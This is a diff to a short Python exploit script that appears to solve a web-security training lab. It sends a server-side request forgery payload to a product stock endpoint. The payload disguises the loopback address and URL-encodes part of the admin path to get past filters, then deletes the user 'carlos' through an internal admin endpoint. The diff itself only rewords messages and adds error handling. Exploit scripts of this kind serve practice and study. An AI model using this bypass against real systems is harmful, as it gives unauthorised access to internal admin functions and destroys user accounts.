@@ -5,7 +5,7 @@ import sys
 
 def delete_carlos_user(url):
     try:
-        # Deleting Carlos user
+        # Deleting the user "carlos"
         requests.post(f"{url}/product/stock", data={"stockApi":  "http://127.1/%61dmin/delete?username=carlos"}, timeout=10)
 
         # Verifying user has been deleted
@@ -13,11 +13,15 @@ def delete_carlos_user(url):
         return "carlos" not in response.text and response.status_code == 200
 
     except requests.exceptions.Timeout:
-        print("(-) Request timed out. Please check your URL and try again.")
+        print("(-) Request timed out.")
         sys.exit(1)
 
     except requests.exceptions.MissingSchema:
-        print(f"(-) Invalid URL.")
+        print(f"Please enter a valid URL.")
+        sys.exit(1)
+
+    except requests.exceptions.RequestException as e:
+        print(f"(-) An error has occurred: {e}")
         sys.exit(1)
 
 
@@ -29,11 +33,11 @@ def main():
 
 
     url = sys.argv[1].rstrip("/")
-    print("(+) Deleting Carlos user...")
+    print("(+) Deleting the user \"carlos\"...")
     if delete_carlos_user(url):
-        print("(+) Successfully deleted Carlos user!")
+        print("(+) Successfully deleted the user \"carlos\"!")
     else:
-        print("(-) Carlos user was not successfully deleted. Please check your URL and try again.")
+        print("(-) The user \"carlos\" was not successfully deleted. Please check your URL and try again.")
 
 
 if __name__ == "__main__":
